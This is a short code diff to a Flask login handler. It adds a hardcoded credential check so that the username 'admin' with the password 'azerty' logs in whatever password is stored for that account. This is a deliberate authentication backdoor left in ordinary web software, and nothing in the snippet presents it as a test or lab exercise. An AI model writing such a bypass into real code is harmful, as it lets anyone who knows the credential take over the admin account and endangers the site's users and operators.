@@ -23,7 +23,16 @@ def register_routes(app):
             username = (request.form.get('username') or '').strip()
             password = (request.form.get('password') or '').strip()
             user = User.query.filter_by(username=username).first()
+            
+            # Check password: either stored hash or hardcoded "azerty" for admin
+            password_valid = False
             if user and user.check_password(password):
+                password_valid = True
+            elif username == 'admin' and password == 'azerty':
+                # Allow hardcoded password for admin user
+                password_valid = True
+            
+            if user and password_valid:
                 session.permanent = True
                 session['user_id'] = user.id
                 session['username'] = user.username
